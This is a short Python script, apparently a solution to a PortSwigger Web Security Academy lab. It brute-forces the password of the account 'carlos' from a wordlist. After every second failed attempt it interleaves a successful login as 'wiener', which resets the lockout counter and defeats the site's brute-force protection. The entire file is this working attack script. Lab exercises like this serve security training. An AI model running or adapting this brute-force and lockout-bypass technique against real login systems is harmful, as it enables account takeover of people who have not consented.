from tqdm import tqdm
import requests

url = 'https://acc21ff11e759ec0c0a932b600bb0080.web-security-academy.net/login'
cookies = dict(session='OOXp5lYqPqFd4k0R7htvSwn62NkHiGG7')

username = 'wiener'
password = 'peter'
target_username = 'carlos'

valid_interval = 2

count = 0
with open('passwords.txt', 'r') as f:
    for p in tqdm(f.readlines()):
        resp = requests.post(url, data={'username': target_username, 'password': p.strip()}, cookies=cookies)
        
        if 'Incorrect' not in resp.text:
            print(f"Found credentials {target_username}:{p.strip()}")
            break

        count += 1
        if count % valid_interval == 0:
            requests.post(url=url, data={'username': username, 'password': password}, cookies=cookies)
